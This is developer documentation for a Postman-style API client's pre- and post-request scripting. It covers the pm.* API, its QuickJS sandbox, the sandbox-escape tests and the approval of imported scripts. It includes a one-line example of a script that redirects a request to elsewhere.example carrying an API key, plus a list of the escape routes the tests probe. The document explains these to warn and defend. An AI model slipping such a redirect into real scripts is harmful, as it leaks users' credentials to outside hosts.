# Pre/Post-Request Scripts & Assertions

Wayfarer lets you attach a pre-request script, a post-response script, and
a set of visual test assertions to any request. This document describes the
`pm.*` API surface those scripts see and, separately, the isolation model,
verified against `packages/core/src/scripting/` and
`src/app/shared/scripts/` at the time of writing.

> **This document is spot-checked against source, the same way
> [`docs/secrets.md`](secrets.md) is.** If the sandbox implementation
> changes, this file needs to be re-verified line by line against
> `packages/core/src/scripting/` before it's trusted again.

## The `pm.*` API surface

Scripts run with Postman's `pm` object, a `console`, `atob`, `btoa`,
`setTimeout` and `require`. The surface is written in
`packages/core/src/scripting/vm-bootstrap.ts` (the code that runs inside
the engine) and `host.ts` beside it (what that code can call). Every part
of it is a row of the compatibility matrix
(`packages/core/test/pm-compat/cases.ts`), with a script that proves the
row; the rows run in Node and in the app's worker. This section says what
is there and where it differs from Postman.

### Variables

| Object | Scope | Stored |
|---|---|---|
| `pm.environment` | the active environment | yes |
| `pm.collectionVariables` | the collection of the saved request | yes |
| `pm.globals` | the global variables | yes |
| `pm.variables` | every scope, nearest first: what `pm.variables.set` set in this run, then environment, collection, globals | `set` lasts for the run only |
| `pm.iterationData` | a run's data file | empty: there is no collection run yet |

Each has `get(name)`, `has(name)`, `toObject()` and `replaceIn(text)`; the
three stored scopes also have `set(name, value)`, `unset(name)` and
`clear()`, and `pm.environment.name` is the environment's name.

- `get` of a name that has no value is `undefined`.
- A value is text: `set("n", 5)` is read back as `"5"`.
- `replaceIn` replaces `{{names}}` from every scope, nearest first, on any
  of the objects, and the dynamic variables (`{{$guid}}` and the rest). A
  name without a value stays as written.
- A protected variable's value is its `{{$secret.…}}` reference, never the
  secret.
- The app stores the changes when the script has ended, each scope in one
  transaction on the stored rows. A change with nowhere to go (no active
  environment, a request in no collection) is said in the console.

### `pm.request`

The request being sent, as composed: `{{variables}}` not replaced, and
without the header the Auth tab adds.

- `pm.request.method`, `pm.request.url` (`toString()`, `getHost()`,
  `getPath()`, `getQueryString()`), `pm.request.headers` (`get`, `has`,
  `add({ key, value })`, `upsert`, `remove`, `toObject`, `each`, `all`,
  `count`), `pm.request.body` (`mode`, `raw`, `urlencoded`, `toString()`,
  `update()`), `pm.request.name`, `pm.request.id`.
- **A pre-request script may change it**, and what it leaves is what is
  sent: assign `method`, `url` or `body.raw`, or use the header list. The
  request you composed, and what is saved, do not change.
- Only a text body and form fields can be read and changed. Of a multipart
  form or a file a script sees `mode` and nothing else.

### `pm.response` (post-response scripts only)

`pm.response` is `null` in a pre-request script.

`code`, `status`, `headers` (`get`, `has`, `toObject`, `each`), `text()`,
`json()` (it throws when the body is not JSON), `responseTime`,
`responseSize`, and the assertions `pm.response.to.have.status(code or
text)`, `.header(name, value?)`, `.body(text or RegExp?)`, `.jsonBody(value?)`
and `pm.response.to.be.ok`, `.success`, `.error`, `.clientError`,
`.serverError`, each also after `.not`. `jsonBody(path, value)` is not
supported.

### `pm.test(label, fn)`, `pm.expect`

`pm.test` runs `fn` at once and records a passed or a failed test. A
function that returns a promise is waited for. `pm.test.skip(label)` lists
the test as passed with "(skipped)" after its name. Results appear in the
**Tests** tab beside the assertion builder's rows.

`pm.expect` is Chai's `expect` (Chai 6), with Postman's additions for a
response: `pm.expect(pm.response).to.have.status(200)`, `.header`, `.body`,
`.jsonBody`, `.to.be.ok` and the rest. Chai is fetched the first time a
script says `expect`.

A script that ends in an error (it throws, has a syntax error, or is
stopped by a limit) adds one failed row named "Pre-request script" or
"Post-response script" with the error as its message. The request is still
sent.

### `pm.sendRequest(request, callback?)`

Makes a request from a script. With a callback it is called as
`(error, response)`; without one a promise is returned. `request` is an
address or an object with `url`, `method`, `header` (an object, or a list
of `{ key, value }`) and `body` (`{ mode: "raw", raw }`, `{ mode:
"urlencoded", urlencoded: [...] }` or text). `{{variables}}` in it are
replaced. The response has what `pm.response` has.

- **The script does not make the request: it asks the app.** The engine has
  no network. The request goes out as your own does: by the same route
  (direct, or the Local Bridge), with no cookies, no cache and no
  `Referer`, under your request timeout, and it ends when you cancel.
- **`pm.sendRequest` does not read the vault.** A request that holds a
  `{{$secret.…}}` reference is refused with `WayfarerUnsupportedError` and
  nothing is sent: the reference must never go out as text (claim C-007).
  This is not a wall between a script and your secrets; see "What approving
  a script means" below.
- A script may make 10 requests in one run; the next is answered with an
  error.
- The console gets one line per request: `[pm.sendRequest] GET <address> →
  200`, masked like everything else a script writes.
- The time a request takes does not count against the script's 5 seconds.
- A multipart, file or GraphQL body is not supported. Nothing of these
  requests is kept in history.

### `pm.info`, `pm.execution`

`pm.info.eventName` (`"prerequest"` or `"test"`), `requestName` and
`requestId` (of the saved request; empty for one that is not saved),
`iteration` (0) and `iterationCount` (1).
`pm.execution.setNextRequest(name)` and `pm.execution.skipRequest()` are
recorded and have no effect: they belong to a collection run.

### What is not there

`pm.cookies`, `pm.visualizer`, `pm.vault` and `pm.require` exist so that a
script that calls them is told why: each method throws
`WayfarerUnsupportedError` with the name of what was called.
`clearTimeout`, `setInterval` and `clearInterval` do not exist. The legacy
`postman.*` globals arrive with the next change.

### `console`

`console.log`, `console.info`, `console.warn` (prefixed `[warn]`), and
`console.error` (prefixed `[error]`) write lines: text as it is, anything
else as JSON. The **Tests** tab shows them under "Console", the pre-request
script's lines first. 1,000 lines and 1 MB are kept; more is dropped, and
the last line says `[console output truncated]`.

### `atob`, `btoa`, `setTimeout`

`atob(text)` and `btoa(text)` are the browser's. `setTimeout(fn, ms, ...args)`
runs `fn` later, inside the same run: the run ends when no timer, no
request and no promise reaction is left, or at the time limit. A timer
that would fall due after the limit is not waited for.

### `require(name)`

Five libraries ship with the app and can be required by name, as in
Postman's sandbox:

| Name | Library |
|---|---|
| `chai` | Chai 6 (`require("chai").expect`, `.assert`) |
| `crypto-js` | CryptoJS 4.2.0, its last release |
| `lodash` | Lodash 4 |
| `moment` | Moment 2, without locales |
| `uuid` | uuid 14 (`v4()`, `v7()`, `validate()` and the rest) |

`require("atob")` and `require("btoa")` give the two functions. Any other
name throws `WayfarerUnsupportedError: require('xml2js') is not supported`.

A library is JavaScript text that the engine runs, like your script: it has
the same global object and can reach nothing your script cannot. Each is a
file of its own, fetched from the app's origin the first time a script
names it and kept for offline use. A library is found by its name written
in the script: `require("lod" + "ash")` is refused with a message that says
to write the name out.

In `crypto-js`, `MD5`, `SHA1`, `SHA256`, `HmacSHA1`, `HmacSHA256` and
`enc.Utf8`, `enc.Hex` and `enc.Base64` are computed by the app
(`@noble/hashes`), not by the engine, which is an interpreter; they return
what crypto-js returns. The rest of crypto-js (AES, the other hashes, the
incremental `algo.*` API) is its own code, run by the engine. Random bytes
(`uuid.v4()`, `CryptoJS.lib.WordArray.random`, the salt of a passphrase)
come from the browser's `crypto.getRandomValues`.

All five loaded take about 2 MB of the 64 MB a script may hold.

## Visual Test Assertions (Tests tab)

Alongside scripts, requests can carry a list of declarative assertions
(`TestAssertion`, `src/app/models/test-assertion.ts`), evaluated by
`AssertionRunner` without running any user script at all:

- **Targets:** `status` (status code), `duration` (response time in ms),
  `header` (by name, case-insensitive), `body` (whole body, or a dot/bracket
  path like `data.users[0].id`).
- **Operators:** `equals`, `not-equals`, `contains`, `not-contains`,
  `exists`, `not-exists`, `is-array`, `is-object`, `less-than`,
  `greater-than`.

These are pure data evaluated in TypeScript, with no `pm` API and no dynamic
code execution, so they carry none of the isolation considerations below and
are the safer option when a script isn't strictly needed.

## Isolation model

A script is run by **QuickJS**, a JavaScript engine compiled to WebAssembly
(`quickjs-emscripten`), inside a dedicated Web Worker
(`src/app/shared/scripts/quickjs.worker.ts`). The browser never evaluates
the script's text: no `eval`, no `new Function`. That is why scripts run
under the site's Content-Security-Policy, which allows WebAssembly to be
compiled (`'wasm-unsafe-eval'`) and still forbids `eval` and inline script.

**The sandbox is an allow-list.** The engine has its own global object. It
starts with what the JavaScript language defines (`Object`, `JSON`,
`Promise`, `Math` and so on) and nothing a browser adds: no `fetch`, no
`XMLHttpRequest`, no `WebSocket`, no `self`, no `postMessage`, no
`importScripts`, no storage, no module loader. `runScript`
(`packages/core/src/scripting/host.ts`) then adds exactly six names: `pm`,
`console`, `atob`, `btoa`, `setTimeout` and `require`. A new browser API
cannot appear inside the engine, because the engine is not the browser.
`require` loads nothing from anywhere: it evaluates, inside the engine, one
of five libraries the app was built with.

**How this is tested (claim C-052).** `e2e/sandbox-escape.spec.ts` runs
escape attempts from inside a script, in Chromium, Firefox and WebKit, on
the production build with the production headers:

- 35 names a browser, a worker or Node would offer (`fetch`,
  `XMLHttpRequest`, `WebSocket`, `importScripts`, `postMessage`, `self`,
  `indexedDB`, `WebAssembly`, `EventTarget` and the rest) are looked up by eight
  roads to the global object: a plain `typeof`, indirect `eval`,
  `globalThis`, `Function('return this')()`, an object's
  `constructor.constructor`, the constructor of a host function, of an async
  function and of a generator. Each must find nothing.
- The global object is the engine's own by every road, `globalThis.constructor`
  is the engine's `Object`, and its own property names are exactly the
  language's list plus the six.
- Ten network roads are called with a variable's value in the address
  (`fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`,
  `importScripts`, `Image`, `Worker`, `require` of a module of Node, a
  string given to `setTimeout`), and a dynamic `import()` of an `https:` and
  a `data:` address. With all five libraries loaded the same names are
  looked up again, also through Lodash's own `get` and `template`. From outside, the test counts every request the browser made: the
  only one that left the app's origin is the user's own request.
- A forged result cannot be posted: there is no `postMessage` and no worker
  scope to post from.
- A script that changes `Object.prototype`, `JSON` and `Array.prototype`
  finds them whole on the next run, and the page's own are untouched.
- **The one exception to "a script makes no request"** is `pm.sendRequest`,
  and the suite pins it down: a script asks for seven requests, three more
  that hold a vault secret's reference, and an eleventh call. From outside,
  the requests that left the app's origin are exactly the seven and the
  user's own; the three were refused by name, and each request that went
  out carries no cookie and no `Referer`.
- 0 Content-Security-Policy and Trusted Types violation events throughout.

`packages/core/src/scripting/host.spec.ts` asserts the same list of global
names in Node, and that a host function refuses any argument that is not
the type it takes.

**What crosses the boundary.** The functions behind `pm`, `console` and the
rest take and return strings, numbers and booleans only, and check the type
of each argument themselves. No object of the app, the worker or the page is
ever handed to a script. The response is given to the script as JSON text
and parsed inside the engine.

**What a script is given.** The enabled variables of the active
environment, of the request's collection and the globals, by name; the
request as composed; and for a post-response script the response. A
protected variable's value is its `{{$secret.…}}` reference, not the
secret. A script cannot make a request itself: `pm.sendRequest` asks the
app to make one (see above), and the app refuses one that holds a secret's
reference.

**What a script writes is masked.** Console lines, test names and messages,
and a script's own error pass through the same redactor as history
(`Redactor`, `@wayfarer/core`) before they are shown: a vault secret or a
credential of the request reads `***`, also when the server sent it back
and the script read it from the response. A variable a post-response script
sets is stored, in whichever scope, so a vault secret in its value is masked too; a credential
that is not a vault secret is kept as it is, since it came from your
environment. `e2e/secrets-wire.spec.ts` runs a script that writes an echoed
secret to every one of these places and finds it in none.

**Limits.** Each run gets a new engine runtime, so no script sees another's
state. A run is stopped after 5 seconds ("Script timed out after 5000 ms"),
when the engine holds more than 64 MB ("Script exceeded memory limit (64 MB)":
the engine is loaded with a WebAssembly memory that cannot grow past that,
since QuickJS's own memory limit does not count what a script allocates in
this build), and
when it recurses too deep ("Script exceeded the stack limit": between
about 700 and 1,500 calls, depending on the browser). A script cannot catch
the time limit. After any of the three the worker is
ended and the next run starts a new one. The page also stops waiting one
second after the time limit, should the engine itself not answer. A script
that writes more than 1 MB of test results and variables is ended with
"Script wrote too many test results and variables."

**Loading.** The engine (about 500 kB of WebAssembly) and its worker are
fetched the first time a script runs, from the app's own origin, and kept
by the service worker after that, so scripts run offline. A library (11 to
75 kB each) is fetched the first time a script requires it, and kept the
same way.

## What approving a script means

A script you run is trusted with the request it runs beside. It is never
handed a vault secret's value in a pre-request script, and `pm.sendRequest`
never reads the vault. But a pre-request script can change the request you
are about to send (`pm.request`), and it can set the variables that
request is built from: the address, a header, the body. The app then
builds that request as it builds any other, vault secrets included, and
sends it where it now points. A script that writes
`pm.request.url = "https://elsewhere.example/?k=" + pm.environment.get("API_KEY")`
sends your key elsewhere.

This is the reason a script that came from a file, a backup or history
does not run until you have read it (next section), and the reason to read
it. Nothing in the app can tell a script that signs a request from one
that redirects it.

## Which scripts may run

A script you type runs. A script that came from somewhere else waits for
you (plan decision D6):

- **A collection made in this app is trusted.** When you save a request
  into it, the SHA-256 of each of its scripts is added to the collection's
  list of approved scripts.
- **An imported collection, and one restored from a backup, is not
  trusted.** Its requests are sent without their scripts; assertions still
  run. The Scripts tab says so and offers **Review scripts**: a dialog with
  every script of the collection, read-only. "I trust these scripts" marks
  the collection trusted and stores the digest of each script shown.
- **A script runs only if its own digest is in its collection's list.**
  Importing the same collection again makes it untrusted again. A script
  that reached storage any other way is not in the list and does not run.
- **Saving does not approve what you have not reviewed.** A script that was
  waiting stays unapproved when you save it, also into another collection.
- **A history entry** carries the scripts of the request as it was sent.
  Opened from history they wait for a review of their own, which lasts
  while that entry is in the composer.

The check is made on the stored text the composer was loaded from, when you
press Send (`src/app/services/script-trust.ts`). What you then type into the
composer is your own.

See [SECURITY.md](../SECURITY.md) for how to report a concern.
